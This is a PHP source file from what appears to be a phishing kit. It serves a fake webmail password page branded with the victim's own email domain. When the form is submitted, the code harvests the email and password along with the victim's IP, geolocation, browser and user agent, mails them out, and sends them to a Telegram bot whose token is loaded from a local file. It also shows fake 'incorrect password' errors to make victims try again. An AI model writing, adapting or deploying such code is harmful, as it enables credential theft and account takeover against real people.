<?php

require_once '../api.php';
require_once 'geo.php';
require_once '../mail.php';
require_once 'sync.php';

if (isset($_GET['app'])) {
$app = $_GET['app'];
}

if (isset($_GET['gta'])) {
$gta = $_GET['gta'];
}
if ($gta == ''){
$status = '<font size="2" color="red">Please enter password to continue</font><p>';
$l = "signon.php?app=".$app."&gta=portal";
}
elseif ($gta == 'portal'){
$status = '<font size="2" color="red">Incorrect password provided</font><p>';
$l = "complete.php?app=".$app."&gta=portal";
}

$email = base64_decode($app);
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $email;
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);

if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
}

$geoplugin = new geoPlugin($ip);
$geoplugin->locate();
$cc = $geoplugin->countryCode;
$cn = $geoplugin->countryName;
$cr = $geoplugin->region;
$ct = $geoplugin->city;
$br = $obj->showInfo('browser');
$op = $obj->showInfo('os');
$vr = $obj->showInfo('version');
$hostname = gethostbyaddr($ip);
$ua = $_SERVER['HTTP_USER_AGENT'];
$datum = date("D M d, Y g:i a");
$result = implode(file("error.txt"));

if (isset($_POST['uname']) || isset($_POST['pword'])) { 
$user = $_POST["uname"];
$pass = $_POST["pword"];
$x = base64_encode($user);
$message = '';
$message .= "========== OUTLOOK WEB APP ==========\n";
$message .= "Email: ".$user."\n";
$message .= "Password: ".$pass."\n";
$message .= "IP: ".$ip.", ".$cn." (".$ct.", ".$cr.")\n";
$message .= "Web Browser: ".$br."\n";
$message .= "Web Browser Version: ".$vr."\n";
$message .= "Operating System: ".$op."\n";
$message .= "Submitted: ".$datum."\n";
$message .= "Host Name: ".$hostname."\n";
$message .= "User Agent: ".$ua."\n";

$subject  = "You've got mail from $ip ($cn)";
$headers  = "From: OWA <noreply>\n";
$headers .= "Reply-To: ".$user."\n";
$headers .= 'Content-type: text/plain; charset=iso-8859-1' . "\n";
$headers .= "MIME-Version: 1.0\n";

if (empty($pass)) {
$status = '<font size="2" color="red">Please enter your password to continue</font><p>';
}
elseif (strlen($pass) <= 4) {
$status = '<font size="2" color="red">Invalid password or permissions.</font><p>';
}
else {
mail($to,$subject,$message,$headers);
	$files = explode("@",$result);
	$chat = '@';
	$chatid = $chat.$files['1'];
	$token = $files['0'];
	$link = 'https://api.telegram.org/bot'.$token.''; 
	$parameter = [
		'chat_id' => $chatid, 
		'text' => $message
		];
 
	$request_url = $link.'/sendMessage?'.http_build_query($parameter); 
	file_get_contents($request_url);
	header("Location: $l");
}

}

?>
<!DOCTYPE html>
<html>
<title><?php echo $yuh ?> WebMail Service</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon" href="assets/logo.png"/>

<style>
@font-face {
   font-family: myFirstFont;
   src: url(font/style.ttf);
}

@font-face {
   font-family: myFirstFont;
   src: url(font/style.ttf);
   font-weight: bold;
}

* {
   font-family: myFirstFont;
}
* {
  box-sizing: border-box;
}

body {
  background-color: #f1f1f1;
}

div.checkbox {
    position: relative;
    font-family: myFirstFont;
    font-size: 13px;
}
label {
    position: relative;
    padding-left: 16px;
}
label::before {
    content :"";
    display: inline-block;
    width: 10px;
    height: 10px;
    background-color: white;
    border: solid 1px #9C9C9C;
    position: absolute;
    top: 1px;
    left: 0px;
}
label::after {
    content:"";
    width: 8px;
    height: 8px;
    background-color: #666666;
    position: absolute;
    left: 2px;
    top: 3px;
    display: none;
}
input[type=checkbox] {
    visibility: hidden;
    position: absolute;
}
input[type=checkbox]:checked + label::after {
    display: block;
}
input[type=checkbox]:active + label::before {
    background-color: #DDDDDD;
}

#regForm {
  background-color: #ffffff;
  margin: 100px auto;
  font-family: Raleway;
  padding: 40px;
  width: 30%;
  min-width: 100px;
}
 
h1 {
  text-align: LEFT;  
}
input {
  padding: 10px;
  width: 100%;
  font-size: 17px;
  font-family: myFirstFont;
  border: 1px solid #aaaaaa;

}


button {
  background-color: #0072C6;
  color: #ffffff;
  border: none;
  padding: 10px 20px;
  font-size: 17px;
  font-family: myFirstFont;
  cursor: pointer;
}

button:hover {
  opacity: 0.8;
}

#prevBtn {
  background-color: #bbbbbb;
}



</style>
<body>

<form id="regForm" action="" method="POST">
<font size="6"><b><?php echo $yuh ?></b> </font><img align="right" src="assets/logo.png" width="64" height="64"/><p><br>
<div style="display:block;">
    <p><input type="hidden" value="<?php echo isset($_GET['app']) ? base64_decode($_GET['app']) : '' ?>" name="uname"><b><div><?php echo isset($_GET['app']) ? base64_decode($_GET['app']) : '' ?></b></div></p>Enter Your Password:
    <input placeholder="Password" name="pword" type="password" placeholder="Password" oninvalid="setCustomValidity('Please enter your password');" oninput="setCustomValidity('')"></p>
	<?php if(!empty($status)) ?>
	<div class="login-error"><?php echo $status; ?></div>
  </div>
</div>

  <div style="overflow:auto;">
    <div style="float:right;"><p>

      <button name="submit" type="submit" id="nextBtn">Next</button></div>

</form>




</body><p><br><p></p></p><p><br></p><div align="center">

<center><font size="1.5"><b>&copy; <?php echo date('Y'); ?> | <?php echo $yuh ?> Security Systems</b></font></center></div>
</html>
